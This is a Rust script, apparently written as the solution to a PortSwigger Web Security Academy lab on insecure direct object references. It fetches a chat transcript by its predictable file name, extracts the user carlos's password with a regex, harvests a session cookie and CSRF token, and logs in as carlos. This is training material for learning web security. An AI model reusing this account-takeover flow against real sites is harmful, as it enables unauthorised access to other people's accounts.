/****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 5/9/2023
*
* PortSwigger LAB: Insecure direct object references
*
* Steps: 1. Fetch 1.txt log file
*        2. Extract carlos password from the log file
*        3. Login as carlos
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a440071031837728035c7be00dc0008.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    // fetch 1.txt log file
    print!("{} ", "1. Fetching 1.txt log file..".white());
    io::stdout().flush();
    let log_file = client
        .get(format!("{url}/download-transcript/1.txt"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch 1.txt log file".red()));
    println!("{}", "OK".green());

    // extract the password from the log file
    print!("{} ", "2. Extracting password from the log file..".white());
    io::stdout().flush();
    let body = log_file.text().unwrap();
    let carlos_pass = capture_pattern(r"password is (.*)\.", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the carlos password".red()
    ));
    println!("{} => {}", "OK".green(), carlos_pass.yellow());

    // fetch login page to get valid session csrf token
    print!(
        "{} ",
        "3. Fetching login page to get valid session and csrf token..".white()
    );
    io::stdout().flush();
    let get_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch login page".red()));
    let session = extract_session_cookie(get_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
    let csrf = extract_csrf(get_login).expect(&format!("{}", "[!] Failed extract csrf".red()));
    println!("{}", "OK".green());

    // login as carlos
    print!("{} ", "4. Logging in as carlos..".white());
    io::stdout().flush();
    let login = client
        .post(format!("{url}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "carlos"),
            ("password", &carlos_pass),
            ("csrf", &csrf),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as carlos".red()));
    let carlos_session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract new session".red()));
    println!("{}", "OK".green());

    // fetch carlos profile
    print!("{} ", "5. Fetching carlos profile..".white());
    io::stdout().flush();
    let carlos_profile = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={carlos_session}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch carlos profile".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*************************************************
 * Function to extract csrf from the response body
 **************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}
